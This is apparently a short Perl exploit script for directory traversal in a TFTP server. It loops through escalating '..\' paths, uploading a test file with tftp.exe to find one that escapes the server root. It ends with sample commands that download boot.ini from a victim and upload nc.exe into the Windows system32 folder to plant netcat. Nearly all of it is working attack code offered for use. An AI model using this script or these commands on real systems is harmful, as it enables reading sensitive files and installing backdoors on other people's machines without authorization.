#!/usr/bin/perl -w
$|=1;
$target_ip=shift || die "usage: $0 \$target_ip\n";
@directory_traversal=(
'..\tmp.txt',
'..\..\tmp.txt',
'..\..\..\tmp.txt',
'..\..\..\..\tmp.txt',
'..\..\..\..\..\tmp.txt',
'..\..\..\..\..\..\tmp.txt',
'..\..\..\..\..\..\..\tmp.txt'
);
open(TMP, ">tmp.txt");
print TMP "tmp";
close(TMP);
foreach $dt_content (@directory_traversal){
	$dt_it=`tftp.exe $target_ip put tmp.txt $dt_content`;
	print "command : tftp.exe $target_ip put tmp.txt $dt_content\n";
	print "$dt_it";
	if($dt_it=~m/^Transferred successfully/){
		print "Directory Traversal PAYLOAD is $dt_content.\n";
		print "Press [ENTER] Button to continue...\n";
		<STDIN>;
	}
	sleep(3);
}
print "Finish!\n";
exit(0);
****************************************************************
Exploit :
****************************************************************
#get sensitive file
c:\windows\system32>tftp [VICTIM_IP] get ../../boot.ini boot.ini
#put malware
c:\windows\system32>tftp [VICTIM_IP] put nc.exe ../../WINDOWS/system32/nc.exe
****************************************************************
